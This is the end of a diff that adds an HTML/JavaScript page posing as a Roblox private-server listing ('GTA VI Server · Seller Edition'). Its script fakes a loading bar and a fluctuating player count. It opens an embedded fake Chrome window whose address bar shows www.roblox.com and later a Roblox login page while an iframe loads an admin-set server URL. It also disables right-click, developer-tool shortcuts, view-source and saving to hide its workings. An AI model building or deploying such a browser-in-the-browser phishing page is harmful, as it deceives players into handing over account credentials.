+                    <svg viewBox="0 0 24 24" class="chrome-star"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path></svg>
+                </div>
+                <div class="chrome-extensions">
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.36 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM19 18H6c-2.21 0-4-1.79-4-4s1.79-4 4-4h.71C7.37 7.69 9.48 6 12 6c3.04 0 5.5 2.46 5.5 5.5v.5H19c1.66 0 3 1.34 3 3s-1.34 3-3 3z"></path></svg>
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+                </div>
+            </div>
+            <div class="browser-content">
+                <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals" style="width:100%; height:100%; min-height:100%; border:none; display:block;"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== MAIN SCRIPT ===== -->
+    <script>
+        let loadCount = 0;
+        let isLoginPage = false;
+
+        (function() {
+            const bar = document.getElementById('loading-bar');
+            const text = document.getElementById('loading-text');
+            const screen = document.getElementById('loading-screen');
+            const app = document.getElementById('app-content');
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    screen.style.opacity = '0';
+                    setTimeout(() => {
+                        screen.style.display = 'none';
+                        app.style.display = 'block';
+                    }, 500);
+                } else {
+                    const step = Math.floor(Math.random() * 12) + 6;
+                    width = Math.min(width + step, 100);
+                    bar.style.width = width + '%';
+                    text.innerText = `Loading... ${width}%`;
+                }
+            }, 140);
+        })();
+
+        (function() {
+            const onlineEl = document.getElementById('onlineCount');
+            if (!onlineEl) return;
+            const base = parseInt(onlineEl.innerText, 10) || 23;
+            setInterval(() => {
+                const delta = Math.floor(Math.random() * 7) - 3;
+                let newVal = base + delta;
+                if (newVal < 12) newVal = 12;
+                if (newVal > 38) newVal = 38;
+                onlineEl.innerText = newVal;
+            }, 3800);
+        })();
+
+        function handleRedirect(message) {
+            if (!PRIVATE_SERVER_URL) {
+                window.alert('Private server URL belum diatur oleh admin.');
+                return;
+            }
+            const loadingModal = document.getElementById('loadingModal');
+            const loadingText = document.getElementById('loadingText');
+            if (loadingText) loadingText.innerText = message || 'Connecting to Server...';
+            loadingModal.classList.add('active');
+            setTimeout(() => {
+                loadingModal.classList.remove('active');
+                showBrowserModal();
+            }, 1200);
+        }
+
+        function showBrowserModal() {
+            const modal = document.getElementById('browserModal');
+            const iframe = document.getElementById('browserIframe');
+            loadCount = 0;
+            isLoginPage = false;
+            iframe.src = PRIVATE_SERVER_URL;
+            updateFakeUrl(FAKE_URL_DISPLAY, false);
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function updateFakeUrl(url, isLogin) {
+            const fakeUrlText = document.getElementById('fakeUrlText');
+            const tabTitle = document.getElementById('modalTabTitle');
+            if (!url) {
+                fakeUrlText.innerHTML = '<span class="chrome-url-dim">https://</span>www.roblox.com';
+                tabTitle.innerText = 'Roblox';
+                return;
+            }
+            fakeUrlText.innerHTML = `<span class="chrome-url-dim">https://</span>${url.replace(/^https?:\/\//, '')}`;
+            tabTitle.innerText = isLogin ? 'Log in to Roblox' : 'Roblox';
+        }
+
+        function closeChromeModal() {
+            const modal = document.getElementById('browserModal');
+            const iframe = document.getElementById('browserIframe');
+            modal.classList.remove('active');
+            document.body.style.overflow = '';
+            iframe.src = 'about:blank';
+            loadCount = 0;
+            isLoginPage = false;
+            updateFakeUrl(FAKE_URL_DISPLAY, false);
+        }
+
+        const iframe = document.getElementById('browserIframe');
+        iframe.addEventListener('load', function() {
+            loadCount++;
+            try {
+                const frameUrl = this.contentWindow.location.href;
+                if (frameUrl && frameUrl.includes('login')) {
+                    isLoginPage = true;
+                    updateFakeUrl(FAKE_URL_LOGIN, true);
+                } else if (frameUrl && frameUrl.includes('games')) {
+                    isLoginPage = false;
+                    updateFakeUrl(FAKE_URL_DISPLAY, false);
+                }
+            } catch(e) {
+                if (loadCount === 1) {
+                    updateFakeUrl(FAKE_URL_DISPLAY, false);
+                } else if (loadCount === 2) {
+                    updateFakeUrl(FAKE_URL_LOGIN, true);
+                } else if (loadCount >= 3) {
+                    updateFakeUrl(FAKE_URL_DISPLAY, false);
+                }
+            }
+        });
+
+        const joinBtns = document.querySelectorAll('.join-btn');
+        joinBtns.forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                handleRedirect('Connecting to server...');
+            });
+        });
+
+        document.getElementById('closeBrowserBtn').addEventListener('click', closeChromeModal);
+        document.getElementById('closeTabBtn').addEventListener('click', closeChromeModal);
+        document.getElementById('browserModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('browserModal')) closeChromeModal();
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && document.getElementById('browserModal').classList.contains('active')) {
+                closeChromeModal();
+            }
+        });
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.key === 'F12' || e.keyCode === 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) return false;
+            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) return false;
+            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) return false;
+            if (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) return false;
+            if (e.ctrlKey && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) return false;
+        };
+        document.addEventListener('dragstart', event => event.preventDefault());
+
+        console.log('✅ GTA VI Server · Seller Edition');
+    </script>
+
+</body>
+</html>
